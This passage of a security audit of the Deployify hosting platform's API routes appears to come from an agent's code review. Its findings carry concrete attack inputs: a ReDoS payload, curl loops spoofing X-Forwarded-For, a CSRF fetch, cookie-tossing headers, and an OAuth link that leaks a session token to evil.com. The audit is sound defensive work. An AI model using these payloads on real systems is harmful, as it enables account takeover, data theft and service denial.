- **Failure scenario:** `variables` comes straight from `await request.json()` with no type or key-shape validation, and its KEYS are concatenated into a regex source. A user with any project + any storage config whose type contains 'sql' POSTs:
{"query":"SELECT ':aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX'","variables":{"(a+)+b":1}}
Line 101 builds /:(a+)+b\b/g and line 102 runs it against the 40-'a' subject. The nested quantifier has no matching 'b', so the engine explores ~2^40 partitions — the Node event loop is pinned for hours on a single request. This runs at line 94-131, BEFORE the read-only keyword check (line 135) and before any DB connection, so no valid credentials or reachable database are needed. Node is single-threaded, so the whole Cloud Run instance stops serving every other tenant's request; a handful of concurrent requests takes out a handful of instances. Line 116 (MySQL branch) hands the attacker the entire alternation group, and line 129 the same for Mongo/Redis connectors.
- **Impact:** Any authenticated user can permanently wedge a shared Cloud Run instance's event loop with one small request, denying service to every other tenant on that instance. Also a general regex-injection primitive over the query text.
- **Evidence:**

```ts
26:  const { variables = {}, widgetId } = body;
...
94:  const varNames = Object.keys(variables);
95:  const sortedNames = [...varNames].sort((a, b) => b.length - a.length);
100:  for (const name of sortedNames) {
101:      const regex = new RegExp(`:${name}\\b`, 'g');
102:      if (regex.test(query)) {
...
116:  const pattern = new RegExp(`:(${sortedNames.join('|')})\\b`, 'g');
...
129:  const regex = new RegExp(`:${key}\\b`, 'g');
```
- **Agent says it ruled out:** Checked for any escaping helper applied to `name`/`key` before interpolation — there is none anywhere in the file (grep 'escapeRegExp|replace(/[.*+?' returns nothing in the repo). Checked whether `variables` is validated: it is destructured at line 26 with only a `= {}` default. Confirmed the substitution block precedes the read-only enforcement at line 135 and the credential fetch at line 173, so authorization to a real database is not required. No timeout wraps this section — the 25s `timeoutPromise` at line 197 is created after it and cannot interrupt synchronous regex work anyway.

### 🟠 HIGH — Public reverse proxy buffers whole request and response bodies into memory with no size cap, no fetch timeout, and no rate limiting at all
- **Location:** `src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:142`
- **Category:** `denial-of-service`
- **Failure scenario:** Three compounding problems on the only unauthenticated, internet-facing data path.
(1) Rate limiting never runs here: src/proxy.ts returns the subdomain rewrite at line 109 (`return NextResponse.rewrite(url, ...)`) BEFORE the `if (pathname.startsWith('/api/'))` rate-limit block at line 115, so every request to `https://<any-project-slug>.deployify.io/...` reaches this handler unmetered.
(2) Line 142 reads the entire request body into a single ArrayBuffer on the Node heap. `next.config.ts` sets `bodySizeLimit: '2mb'` only under `experimental.serverActions`, which does not apply to route handlers. A single `curl -X POST --data-binary @2GB.bin https://slug.deployify.io/` allocates 2GB in the handler; a Cloud Run instance with the common 512Mi limit OOMs and is killed, dropping every in-flight request for every tenant on it. Lines 182/207 do the same for the response side.
(3) Line 164 calls fetch with no `signal`/AbortSignal. A slow or hung target Cloud Run app holds the buffered body and the connection open until the platform request timeout (up to 60 minutes on Cloud Run), so slowloris-style concurrency exhausts the instance's request slots.
Each HTML GET also performs an unmetered Firestore write plus a BigQuery streaming insert via `logEdgeEvent` (line 179 -> lines 44-52), and every request costs at least one Firestore read in `resolveProject` (`getProjectBySlugGlobal`, src/lib/db.ts:671, uncached), so a flood is also a direct billing amplification against the platform.
- **Impact:** Unauthenticated remote memory exhaustion and connection exhaustion of shared Cloud Run instances, plus unmetered Firestore/BigQuery write amplification billed to Deployify.
- **Evidence:**

```ts
138:  // Add body for non-GET/HEAD methods
139:  if (method !== 'GET' && method !== 'HEAD') {
142:      fetchOptions.body = await req.arrayBuffer();
...
164:  const targetResponse = await fetch(targetUrl, fetchOptions);
...
182:  let html = await targetResponse.text();
...
207:  const body = await targetResponse.arrayBuffer();
```
- **Agent says it ruled out:** Read src/proxy.ts end-to-end and confirmed the rewrite at line 109 short-circuits before the rate limiter at line 115 — subdomain traffic is never rate limited. Grepped the route for AbortSignal/AbortController/timeout — none. Grepped next.config.ts for any body size configuration — only `experimental.serverActions.bodySizeLimit`, which does not govern route handlers. Confirmed `getProjectBySlugGlobal` (src/lib/db.ts:671-690) performs a live Firestore query with no cache layer.

### 🟠 HIGH — Cloud SQL machine `tier` and HA flag are taken unvalidated from the request body and there is no provisioning quota anywhere
- **Location:** `src/app/api/projects/[id]/storage/route.ts:120`
- **Category:** `resource-exhaustion`
- **Failure scenario:** Any signed-up user creates a project (they are owner, so `checkProjectAccess` passes and `access.role !== 'viewer'`) and POSTs to /api/projects/{id}/storage with `{"type":"cloud-sql-postgres","name":"a1","provision":true,"region":"us-central1","metadata":{"tier":"db-custom-96-624000","highAvailability":true,"pitrEnabled":true}}`. `metadata.tier` is never checked against an allowlist and flows into the Cloud SQL Admin API call at cloudsql.ts:51 using Deployify's own service-account token (`getGcpAccessToken()`), creating a 96-vCPU / 624GB regional HA instance in the PLATFORM's GCP project — roughly USD 10k+/month per instance. `region` is equally unvalidated. Nothing rate-limits or caps this: `checkUsageLimits` from src/lib/billing/caps.ts is imported by exactly one file (src/app/api/projects/[id]/deploy/route.ts:5) and never by any storage route, and `TIERS[...].limits` (src/lib/billing/tiers.ts:27) is read only by the billing UI and the usage-alert tracker, never as a gate. The same unvalidated tier reaches read-replica creation at src/app/api/projects/[id]/storage/[storageId]/replica/route.ts:58 (`const tier = body.tier || ...`). The default proxy.ts limit is 100 req/min/IP/instance, so a script can request dozens of these per minute.
- **Impact:** Unbounded financial denial of service: a free-tier account can provision arbitrarily large GCP resources billed to the platform, and can exhaust the platform GCP project's Cloud SQL instance quota so no legitimate tenant can provision.
- **Evidence:**

```ts
src/app/api/projects/[id]/storage/route.ts:
 81:  const { type, name, environment = 'both', connectionString, ..., provision = false, region, ... } = body;
 82:  let metadata = body.metadata;
117:  provisionResult = await createCloudSqlInstance(resourceName, 'postgres', targetRegion, {
118:      highAvailability: metadata?.highAvailability,
119:      pitrEnabled: metadata?.pitrEnabled,
120:      tier: metadata?.tier
121:  });

src/lib/gcp/cloudsql.ts:
 45:  body: JSON.stringify({
 46:      name: instanceName,
 47:      region,
 51:      tier: options.tier || 'db-f1-micro',
 52:      availabilityType: options.highAvailability ? 'REGIONAL' : 'ZONAL',
```
- **Agent says it ruled out:** Grepped all of src/lib and src/app/api for `quota|checkPlanLimit|enforceQuota|maxProjects` — zero hits. Grepped for importers of '@/lib/billing/caps' — only src/app/api/projects/[id]/deploy/route.ts. Grepped for `limits.projects|limits.deployments|limits.buildMinutes` — only UI (src/app/billing/page.tsx), pricing math, and alert emails (src/lib/billing/tracker.ts:148), never a rejection. Confirmed the viewer role check at line 74 is the only authorization gate and it does not apply to a project's own owner.

### 🟠 HIGH — Razorpay payment verification trusts a client-supplied `tierId` that is not covered by the signature
- **Location:** `src/app/api/billing/verify/route.ts:19`
- **Category:** `input-validation`
- **Failure scenario:** `verifyPaymentSignature` only HMACs `orderId|paymentId`; `tierId` is outside the signed material and is never compared against the order's `notes.tierId` (which checkout DOES set at src/app/api/billing/checkout/route.ts:79). A user completes a genuine 1500 INR 'pro' checkout, then replays the browser's own verify call with the body changed to `{"orderId":"<real>","paymentId":"<real>","signature":"<real>","tierId":"enterprise"}`. The signature validates, and line 41 writes `tier: 'enterprise'` to the user document and re-mints the session cookie with it (lines 52-58). `tierId` is also not checked against TIERS at all here, so `"tierId":"free"` or any arbitrary string is written verbatim into the subscription. There is additionally no idempotency/one-use check on `orderId`, so the same signed triple can be replayed indefinitely to keep extending `currentPeriodEnd` by 30 days.
- **Impact:** Pay the cheapest tier, receive the most expensive one, and renew forever from a single payment — direct revenue loss, and the escalated tier is what the rest of the system reads for entitlements.
- **Evidence:**

```ts
19:  const { orderId, paymentId, signature, tierId } = body;
 21:  if (!orderId || !paymentId || !signature || !tierId) { ... }
 27:  const isValid = verifyPaymentSignature(orderId, paymentId, signature);
 ...
 40:  const updatedSubscription = {
 41:      tier: tierId as 'free' | 'pro' | 'team' | 'enterprise',
 42:      status: 'active' as const,

src/lib/billing/payments.ts:
 59:  hmac.update(orderId + '|' + paymentId);
 61:  return generatedSignature === signature;
```
- **Agent says it ruled out:** Read src/lib/billing/payments.ts:47-61 and confirmed the HMAC covers only orderId and paymentId. Grepped the verify route for any `TIERS[` lookup or comparison to the order's notes — none; the route never re-fetches the order from Razorpay. Checked src/app/api/billing/webhook/route.ts:37 which does correctly read `tierId` from the order `notes`, confirming the intended binding exists but is bypassed by this client-driven path.

### 🟠 HIGH — All rate limiting is per-instance in-memory keyed on a spoofable X-Forwarded-For, with stores that never shrink, and the shared `checkRateLimit` helper is dead code
- **Location:** `src/proxy.ts:116`
- **Category:** `rate-limiting`
- **Failure scenario:** Three independent defects in one mechanism.
(1) Bypass: on Cloud Run the front end APPENDS the caller's IP to an existing X-Forwarded-For header rather than replacing it, so `.split(',')[0]` returns the value the ATTACKER sent. `for i in $(seq 1 100000); do curl -H "X-Forwarded-For: 1.2.3.$((RANDOM%255))" https://app/api/auth/github; done` gets a fresh 30-request bucket per header value — the 'strict' 30/min auth limit (proxy.ts:122) is nullified, as is the 20/min analytics limit at collect/route.ts:53.
(2) Multi-instance: both Maps are process-local. Cloud Run autoscales, so the effective limit is 100 x N instances and simply raising concurrency spreads a flood across instances that cannot see each other's counters.
(3) Unbounded growth: neither store is ever cleaned. proxy.ts keys on `${ip}:${pathname}` and the rate-limit branch fires for ANY path under /api/, including non-existent ones, so `GET /api/<random-uuid>` inserts a permanent entry per request. A few million requests (or a few million spoofed XFF values against collect/route.ts:58) grows the Map past the instance memory limit and the container is OOM-killed. src/lib/security/index.ts at least attempts cleanup (`if (Math.random() < 0.01) cleanupExpiredEntries()` at line 20) — but that function is imported by no route in the codebase, so it protects nothing.
- **Impact:** Every rate limit in the product is bypassable with one spoofed header, which re-opens credential stuffing on /api/auth/*, unmetered analytics ingestion, and unmetered access to the expensive endpoints elsewhere in this report; the same header also drives an unauthenticated memory-exhaustion primitive against every instance.
- **Evidence:**

```ts
src/proxy.ts:
 21:  const rateLimitStore = new Map<string, { count: number; resetAt: number }>();
116:  const ip = request.headers.get('x-forwarded-for')?.split(',')[0] ||
117:      request.headers.get('x-real-ip') ||
118:      'unknown';
124:  const rateLimitResult = checkRateLimit(`${ip}:${pathname}`, limit);
(no cleanup function exists in this file — grep for cleanup/delete on rateLimitStore returns nothing)

src/app/api/v1/collect/route.ts:
 11:  const rateLimitMap = new Map<string, { count: number; lastReset: number }>();
 28:  let ip = req.headers.get('x-forwarded-for')?.split(',')[0] || ...
 58:  rateLimitMap.set(ip, rateInfo);
(also never deleted from)

src/lib/security/index.ts:
 11:  export function checkRateLimit(  <- exported but imported by zero files
```
- **Agent says it ruled out:** Grepped the entire repo for `checkRateLimit` — only the definition in src/lib/security/index.ts:11 and the private duplicate in src/proxy.ts:23; no API route imports it. Grepped for Redis/Firestore-backed limiting (`ioredis` is a dependency but is only used for user-owned Memorystore connectors in the storage routes, never for rate limiting). Grepped both stores for `.delete(`/cleanup — proxy.ts and collect/route.ts have none. Checked whether a trusted-proxy hop count or `request.ip` is used instead of the raw header — it is not.

### 🟠 HIGH — Analytics collector accepts an unbounded, untyped payload and a hardcoded bypass API key, then writes it to Firestore and streams it to BigQuery
- **Location:** `src/app/api/v1/collect/route.ts:66`
- **Category:** `input-validation`
- **Failure scenario:** The route is public (no session, and src/proxy.ts does not gate /api/v1/*). Line 66 accepts the literal string 'deployify-dashboard-internal' as a universal credential — it is shipped to browsers, so anyone can read it — meaning no valid project key is needed at all. None of `type`, `path`, `referrer`, `width` or `metrics` is type-checked or length-checked, and `metrics` is an arbitrary nested object written verbatim. An attacker POSTs `{"apiKey":"deployify-dashboard-internal","metrics":{"x":"<900KB string>"}}` in a loop with a randomized X-Forwarded-For header (which defeats the 20/min counter at line 53 as described in the rate-limiting finding). Each request creates a ~1MB Firestore document AND a BigQuery streaming insert. 100 req/s sustains ~100MB/s of Firestore writes plus BigQuery streaming-insert charges, all billed to the platform, and pollutes the analytics dataset for the 'deployify-dashboard' project. A `metrics` object nested past Firestore's 20-level limit instead throws, taking the 500 path on every request.
- **Impact:** Unauthenticated, unmetered write and cost amplification against the platform's Firestore and BigQuery, plus permanent corruption of the analytics dataset.
- **Evidence:**

```ts
25:  const body = await req.json();
 26:  const { type, path, referrer, width, metrics, apiKey } = body;
 ...
 66:  const isInternal = apiKey === 'deployify-dashboard-internal';
 68:  if (isInternal) {
 69:      projectId = 'deployify-dashboard';
 ...
 80:  const eventData = {
 82:      type: type || 'pageview',
 83:      path: path || '/',
 84:      referrer: referrer || '',
 85:      width: width || 0,
 86:      metrics: metrics || null,
 ...
 93:  await db.collection(Collections.ANALYTICS_EVENTS).add(eventData);
 97:  streamEventToBigQuery({ ...eventData, source: 'client', ... })
```
- **Agent says it ruled out:** Grepped the route for getSession/requireAuth — none; it is intentionally public but relies solely on the apiKey check, which line 66 short-circuits. Confirmed src/proxy.ts explicitly lets /api/v1/collect through the subdomain rewrite (line 101) and applies only the generic 100/min IP bucket on the base domain. Confirmed no field length/type validation exists between line 26 and the Firestore write at line 93. Confirmed `streamEventToBigQuery` is fire-and-forget (`.catch` only, line 102) so failures do not throttle the loop.

### 🟡 MEDIUM — Team invite passes an unvalidated `email` value straight to Resend, which accepts an array of recipients
- **Location:** `src/app/api/teams/[id]/invite/route.ts:46`
- **Category:** `input-validation`
- **Failure scenario:** The only check on `email` is falsiness — no `typeof`, no format regex. `SendEmailOptions.to` is typed `string` but that is erased at runtime and the value originates from `await request.json()`. Resend's `emails.send` accepts `string | string[]` (up to 50 recipients per call). A user creates their own team (they are automatically owner, satisfying the owner/admin check at line 38) and POSTs `{"email":["victim1@x.com", ... 50 addresses ...],"role":"member"}`. Resend delivers the invite HTML to all 50 arbitrary third parties, `from` = the platform's verified sending domain (config.email.fromAddress). The generic proxy.ts bucket allows 100 such requests per minute per IP per instance — and that bucket is itself bypassable per the rate-limiting finding — so this is a 5,000+ messages/minute open relay. `role` is validated against a list at lines 55-60 but `email` is not, and each call also writes an invite document via `createInvite` with the array as the stored email.
- **Impact:** The platform's verified sending domain and Resend quota become a spam relay: deliverability damage, domain blacklisting, and Resend account suspension, plus unbounded invite documents in Firestore.
- **Evidence:**

```ts
src/app/api/teams/[id]/invite/route.ts:
 45:  const body = await request.json();
 46:  const { email, role = 'member' } = body;
 48:  if (!email) {
 49:      return NextResponse.json({ error: 'Email is required' }, ...);
 ...
 68:  const emailResult = await sendEmail({
 69:      to: email,
 70:      subject,
 71:      html,
 72:  });

src/lib/email/client.ts:
 42:  const { data, error } = await client.emails.send({
 43:      from: config.email.fromAddress,
 44:      to,
```
- **Agent says it ruled out:** Grepped the route for any email-format validation or `typeof email !== 'string'` guard — there is none; line 48 is a bare falsiness check. Read src/lib/email/client.ts end-to-end: `to` is forwarded to Resend with no normalization or runtime type check (line 44). Checked whether an authorization gate blocks this — lines 36-43 require owner/admin, but a user is owner of any team they create themselves, so it is not a barrier. Checked src/proxy.ts:46-49 `strictRateLimitRoutes` — it covers only /api/auth/ and /api/webhooks/, not /api/teams/.

> **Coverage notes (D8):** SWEPT: all 84 route.ts files under src/app/api (43 consume a JSON body); src/lib/security/index.ts; src/proxy.ts; src/app/api/v1/collect/route.ts; src/app/api/v1/proxy/[slug]/[[...path]]/route.ts (read end-to-end); the full 1000-line Data Lab query route; src/lib/utils/masking.ts; src/lib/logging/parser.ts + tracker.ts; src/lib/gcp/cloudsql.ts createInstance; src/lib/billing/{payments,tiers,caps}.ts; src/lib/email/client.ts; next.config.ts.

VALIDATION COVERAGE QUANTIFIED: there is no schema-validation library in package.json (no zod/valibot/yup/joi/ajv). Of the 43 route files that call req.json()/request.json(), 22 contain ZERO runtime type checks of any kind (no `typeof`, no `Array.isArray`, no regex `.test()`, no `instanceof`) — including billing/checkout, billing/verify, invites/accept, teams/[id]/invite, teams/[id]/members/[userId], every storage backup/restore/branch/cutover/export/import/ingest/migrations/dashboards route, and v1/collect. Another 10 have exactly one such check. Validation, where it exists, is ad hoc presence checking (`if (!x) return 400`), which is why type-confusion (array where a string is expected) and unbounded-value bugs recur.

RATE LIMITING SUMMARY: three separate implementations. src/lib/security/index.ts `checkRateLimit` is exported but imported by ZERO routes — dead code, and it is the only one with any cleanup (Math.random()<0.01). src/proxy.ts has a private duplicate with no cleanup at all, and its store is only consulted after the subdomain-rewrite early return, so all public project traffic is unlimited. src/app/api/v1/collect/route.ts has a third, also with no cleanup. All three key on the attacker-controlled first element of X-Forwarded-For and all three are per-process, which is meaningless on autoscaled Cloud Run.

ALSO CONFIRMED BUT NOT REPORTED (below the bar or dominated by a reported finding): (a) src/app/api/projects/[id]/storage/[storageId]/export/pdf/route.ts:24-120 takes an unbounded `results` array from the body and renders every row through pdfkit while accumulating chunks in the heap — a real CPU/heap bomb for any project member including viewers (no role check), but it is a strict subset of the "no body size limit anywhere" problem already covered by findings 3 and 4; (b) the same PDF route dereferences `storageName.toUpperCase()` with no guard (line 45) — undefined input yields a 500, cosmetic; (c) src/app/api/projects/[id]/deployments/route.ts:37-38 `parseInt(limitParam,10)` is unvalidated and feeds Firestore `.limit()` plus an unbounded `Promise.all` fan-out at line 49 — but the read is bounded by the project's actual deployment count, so it is not usefully amplifiable; (d) MongoDB `filter` at query/route.ts:775-781 is passed raw to `find()` (operator injection incl. `$where`) but only against the user's OWN database; (e) the email regex in masking.ts is quadratic-backtracking but only ever runs over the user's own query results (grep confirmed maskData has exactly two call sites); (f) env var `value` (env/route.ts:88) has no length cap, so a ~900KB value can push a project document past Firestore's 1MB limit and brick further writes to that project.

NOT COVERED: I did not dynamically execute anything (no requests issued, no tests run); Cloud Run's exact X-Forwarded-For append behavior in this specific deployment is asserted from GCP's documented front-end behavior, not observed. I did not audit src/components, the CLI under src/cli, or scripts/. I did not review src/app/api/webhooks/github (HMAC verification looked correct on read) or the GitHub OAuth callback in depth, as those fall under the auth dimension.


## D9. Client-side security (XSS / CSRF / CSP)  <sub>`xss-frontend-sec`</sub>

### 🔴 CRITICAL — OAuth callback builds its CLI redirect from an unvalidated `port` query parameter, letting any attacker-supplied link exfiltrate the victim's session JWT to an arbitrary origin
- **Location:** `src/app/api/auth/callback/route.ts:76`
- **Category:** `open-redirect-token-leak`
- **Failure scenario:** Attacker sends a logged-in-to-GitHub victim the link `https://<app>/api/auth/github?cli=true&port=80@evil.com`. That handler mints a fresh valid `oauth_state`, stores `{cli:true, port:"80@evil.com"}` in `deployify_cli_context`, and redirects to GitHub. GitHub (already authorized for this OAuth app) silently redirects back to `/api/auth/callback`. State verification passes because the state was legitimately created in this same flow. The callback mints a 7-day session JWT for the victim and builds `http://localhost:80@evil.com/callback?token=<victim JWT>`. I verified in Node that `new URL('http://localhost:80@evil.com/callback?token=X')` parses with `host = evil.com`, `origin = http://evil.com` — `localhost:80` becomes userinfo. Next's `validateURL()` (node_modules/next/dist/server/web/utils.js:125) only does `String(new URL(url))`, so the Location header is emitted verbatim and the victim's browser navigates to evil.com carrying the session token in the query string.
- **Impact:** Full, one-click account takeover of any Deployify user. The leaked value is the `deployify_session` JWT itself (7-day lifetime, contains the user's GitHub OAuth `accessToken` with `repo` scope per src/lib/auth.ts:15-38), so the attacker gets both the Deployify account and the victim's GitHub repo access. No XSS, no CSRF token bypass, and no user interaction beyond clicking a link is required.
- **Evidence:**

```ts
src/app/api/auth/github/route.ts:9-33
        const cli = searchParams.get('cli') === 'true';
        const port = searchParams.get('port');
        ...
        if (cli && port) {
            cookieStore.set('deployify_cli_context', JSON.stringify({ cli, port }), {

src/app/api/auth/callback/route.ts:70-77
        const cliContextCookie = cookieStore.get('deployify_cli_context');
        if (cliContextCookie) {
            try {
                const context = JSON.parse(cliContextCookie.value);
                if (context.cli && context.port) {
                    // Redirect to CLI local server with token
                    const redirectUrl = `http://localhost:${context.port}/callback?token=${sessionToken}`;
                    const response = NextResponse.redirect(redirectUrl);
```
- **Agent says it ruled out:** Grepped the whole repo for any numeric/format validation of `port` — there is none (`searchParams.get('port')` is written straight into the cookie and then into the URL template). Checked that the OAuth `state` cookie mitigates this: it does not, because the attacker's link starts the flow at `/api/auth/github`, which generates a matching state itself (src/app/api/auth/github/route.ts:13-23). Read Next's `validateURL` to confirm it does not reject userinfo-bearing URLs. Confirmed there is no allowlist of redirect hosts anywhere (`grep -rn 'callbackUrl|redirectTo|returnTo' src/` returns only src/app/join/page.tsx:41).

### 🟠 HIGH — Reverse proxy copies `Set-Cookie` from untrusted tenant apps onto `<slug>.<app-domain>`, and the session cookie has no `__Host-` prefix — enabling cookie tossing / session fixation on the platform itself
- **Location:** `src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:170`
- **Category:** `session-fixation`
- **Failure scenario:** `set-cookie` is not in `skipHeaders`. I confirmed in Node that undici's `Headers.forEach` yields `set-cookie` entries (so `responseHeaders.set('set-cookie', ...)` forwards the tenant's last Set-Cookie verbatim). An attacker signs up, deploys any app, and gets `attacker.<app-domain>`. Their Cloud Run app answers with `Set-Cookie: deployify_session=<attacker's own valid JWT>; Domain=<app-domain>; Path=/dashboard`. The proxy forwards it, and the browser accepts it because `Domain` is a registrable-domain suffix of the requesting host. The victim clicks any link to `attacker.<app-domain>`; the cookie is now stored. When the victim later opens `<app-domain>/dashboard`, RFC 6265 orders longer-path cookies first, so `cookies().get('deployify_session')` in src/lib/auth.ts:90 returns the attacker's token instead of the victim's host-only cookie.
- **Impact:** Session fixation: the victim silently operates inside the attacker's account. Every repository they import, environment variable they add, storage connector they attach (with its connection string), and payment method they register lands in the attacker's tenant — and `POST /api/projects` stores `githubToken: encrypt(session.accessToken)` (src/app/api/projects/route.ts), so the victim's GitHub OAuth token gets persisted on an attacker-owned project. The same passthrough also lets one tenant set a `Domain=<app-domain>` cookie that the proxy then forwards (request headers are relayed verbatim at lines 124-128, excluding only `host` and `connection`) into every other tenant's Cloud Run service.
- **Evidence:**

```ts
src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:169-175
        // Copy allowed headers from target response
        const skipHeaders = ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 'x-frame-options'];
        targetResponse.headers.forEach((value, key) => {
            if (!skipHeaders.includes(key.toLowerCase())) {
                responseHeaders.set(key, value);
            }
        });

src/lib/auth.ts:117-123
    cookieStore.set(COOKIE_NAME, token, {
        httpOnly: true,
        secure: isSecure,
        sameSite: 'lax',
        path: '/',
        maxAge: 7 * 24 * 60 * 60, // 7 days
    });

src/proxy.ts:86-87 / 99-111 (tenant sites are siblings of the app origin)
                if (hostname.endsWith(`.${baseHostname}`)) {
                    subdomain = hostname.replace(`.${baseHostname}`, '');
        ...
        if (subdomain && !reservedSubdoma
… (truncated)
```
- **Agent says it ruled out:** Grepped for `__Host-` / `__Secure-` prefixes and a `domain:` attribute on the session cookie — none (src/lib/auth.ts:117-123, src/app/api/auth/callback/route.ts:97-103). Checked `skipHeaders` for `set-cookie` — absent. Verified with a Node script that `Headers.forEach` iterates `set-cookie` (Node 20 spec behaviour) so the value survives the copy loop. Checked src/proxy.ts for any sanitising of proxied responses beyond `securityHeaders` (lines 12-18) — it only adds X-Content-Type-Options / X-Frame-Options / X-XSS-Protection / Referrer-Policy / Permissions-Policy.

### 🟠 HIGH — No CSRF token or Origin/Sec-Fetch-Site check on any of the 84 API route handlers, and SameSite=Lax provides no protection because attacker-controlled HTML is served from same-site sibling subdomains
- **Location:** `src/lib/auth.ts:120`
- **Category:** `csrf`
- **Failure scenario:** `grep -rniE "origin|sec-fetch|referer" src/app/api src/proxy.ts src/middleware` returns zero validation hits — the only `csrf` string in the codebase is the OAuth `state` for the login flow. Because tenant apps are proxied at `<slug>.<app-domain>`, an attacker's deployed app is *same-site* with the dashboard, so SameSite=Lax does not block its subresource requests. Attacker page on `attacker.<app-domain>` runs `fetch('https://<app-domain>/api/projects', {method:'POST', credentials:'include', headers:{'Content-Type':'text/plain'}, body: JSON.stringify({repoFullName:'attacker/backdoor'})})`. `text/plain` keeps it a CORS *simple* request, so no preflight is sent and the request executes; `await request.json()` parses the body regardless of Content-Type. The response is unreadable (blind CSRF) but the write has already happened.
- **Impact:** Any victim who visits any page on any tenant's Deployify-hosted site can have state changed in their own Deployify account: a project created from an attacker-controlled repository (which persists an encrypted copy of the victim's `repo`-scoped GitHub token and wires up a webhook-triggered build pipeline in the victim's GCP project), environment variables added via `POST /api/projects/[id]/env`, and any other cookie-authenticated POST. Because the malicious page is same-site, none of the browser's default CSRF mitigations apply.
- **Evidence:**

```ts
src/lib/auth.ts:117-123 (the only auth signal for mutating routes)
    cookieStore.set(COOKIE_NAME, token, {
        httpOnly: true,
        secure: isSecure,
        sameSite: 'lax',
        path: '/',

src/app/api/projects/route.ts (POST — representative mutating route, no Origin check)
export async function POST(request: NextRequest) {
    try {
        const session = await getSession();
        if (!session) { ... }
        const body = await request.json();
        const { repoFullName, name, ... } = body;

src/proxy.ts:99-111 (arbitrary tenant HTML is served from a sibling subdomain of the app origin)
        if (subdomain && !reservedSubdomains.includes(subdomain)) {
            ...
            url.pathname = `/api/v1/proxy/${subdomain}${pathname}`;
```
- **Agent says it ruled out:** Grepped for `csrf`, `x-requested-with`, `sec-fetch-site`, `headers.get('origin')` and `referer` across src/ — only OAuth-state comments in src/app/api/auth/{github,callback}. Confirmed `checkProjectAccess` (src/middleware/rbac.ts) is authorization only, keyed on the session user, and does nothing about request provenance. Confirmed Next.js Server Action origin checking does not apply — the mutating surface is route handlers under src/app/api/**, not Server Actions. Confirmed the reserved-subdomain list in src/proxy.ts:96 does not prevent attackers from getting a subdomain, it only carves out platform names.

### 🟠 HIGH — Public shared-dashboard query executes the widget's saved query against a caller-supplied `storageId` instead of the widget's own connector
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/query/route.ts:58`
- **Category:** `broken-access-control`
- **Failure scenario:** The code faithfully pins `query` to the widget's saved query but resolves `storageConfig` from the `storageId` path segment, never comparing it to `widgetData.storageId`. A project that publishes one widget (e.g. a harmless `SELECT * FROM users LIMIT 100` on a staging replica) can be attacked by anyone who knows any other connector id in the same project: `POST /api/projects/<projectId>/storage/<OTHER_STORAGE_ID>/query` with body `{"widgetId":"<the public widget id>"}` and no cookie at all. The saved query is then executed against the production database connector, whose credentials are fetched server-side at line 187 (`getSecretValue(storageConfig.connectionStringSecretId)`). Other public widget ids and their `storageId` values are themselves disclosed anonymously by `GET /api/projects/[id]/storage/dashboards/[dashboardId]` (src/app/api/projects/[id]/storage/dashboards/[dashboardId]/route.ts:41-56 returns the whole document, including `query` and `storageId`, whenever `isPublic` is true), so a project with two public widgets on two connectors can always be crossed.
- **Impact:** Unauthenticated cross-connector data read. Results pass through `maskData`, but that is regex-only (src/lib/utils/masking.ts:6-12 covers just email/phone/credit-card/SSN/token patterns), so names, addresses, internal identifiers, hashes and all business data are returned in full — up to MAX_ROWS = 500 per call, repeatable. It also lets an anonymous caller drive connections and 25-second query load against connectors that were never shared.
- **Evidence:**

```ts
src/app/api/projects/[id]/storage/[storageId]/query/route.ts:35-59
        if (widgetId) {
            // Public Widget Path: No session required, but must be a valid public widget
            const db = getDb();
            const widgetDoc = await db.collection(Collections.PROJECTS).doc(id).collection('storage_dashboards').doc(widgetId).get();
            ...
            const widgetData = widgetDoc.data();
            if (!widgetData?.isPublic) {
                return NextResponse.json({ success: false, error: 'Forbidden: Widget is not public' }, { status: 403 });
            }

            // Enforce the saved query for public access
            query = widgetData.query;
            ...
                const projectDoc = await db.collection(Collections.PROJECTS).doc(id).get();
                const projectData = projectDoc.data();
                storageConfig = projectData?.storageC
… (truncated)
```
- **Agent says it ruled out:** Read the whole authorization block (lines 30-80): the `widgetId` branch never calls `getSession()` or `checkProjectAccess`, and never validates `storageId === widgetData.storageId`. Checked the SQL read-only filter at lines 136-173 — it constrains the *verb*, not the *target database*, so it does not mitigate this. Checked `shouldMask = widgetId || access?.role === 'viewer'` (line 943) and read src/lib/utils/masking.ts to confirm masking is pattern-based and partial. Confirmed the feature is reachable: src/components/DataLab.tsx:1885-1888 builds the share URL and flips `isPublic: true`.

### 🟡 MEDIUM — Both rate limiters trust the first `X-Forwarded-For` entry, which is client-supplied, so the platform's only abuse control is bypassed with one header
- **Location:** `src/proxy.ts:116`
- **Category:** `rate-limit-bypass`
- **Failure scenario:** Google's front ends append the real client IP to a caller-supplied `X-Forwarded-For` rather than replacing it, so `split(',')[0]` returns whatever the caller sent. An attacker issues each request with `X-Forwarded-For: <random IPv4>` and both limiters see a fresh identity every time: `checkRateLimit` at src/proxy.ts:23 creates a new bucket, and `rateLimitMap` in the collector never accumulates. The 30-requests-per-minute cap on `/api/auth/*` and the 20-per-minute cap on `/api/v1/collect` are both nullified. `x-real-ip` is only consulted when XFF is absent, so it is not a fallback check. The same spoofed value is what gets persisted as the visitor IP in `logEdgeEvent` (src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:17-30) and in the collector's `eventData.ip`.
- **Impact:** No effective rate limiting anywhere on the platform. Unbounded unauthenticated requests to `/api/v1/collect`, each producing a Firestore document write plus a BigQuery streaming insert (lines 89-99) — direct cost amplification and analytics poisoning with attacker-chosen source IPs. The same bypass removes the only brute-force / enumeration control in front of the auth and webhook routes. The in-memory `Map` backing both limiters is also per-instance, so an autoscaled Cloud Run deployment multiplies the effective limit by the instance count even without spoofing.
- **Evidence:**

```ts
src/proxy.ts:114-124 (edge limiter guarding every /api/ route, 30/min on /api/auth/)
        if (pathname.startsWith('/api/')) {
            const ip = request.headers.get('x-forwarded-for')?.split(',')[0] ||
                request.headers.get('x-real-ip') ||
                'unknown';
            ...
            const rateLimitResult = checkRateLimit(`${ip}:${pathname}`, limit);

src/app/api/v1/collect/route.ts:26-56 (unauthenticated ingest limiter, same flaw)
        let ip = req.headers.get('x-forwarded-for')?.split(',')[0] ||
            req.headers.get('x-real-ip') ||
            'unknown';
        ...
        const rateInfo = rateLimitMap.get(ip) || { count: 0, lastReset: now };
```
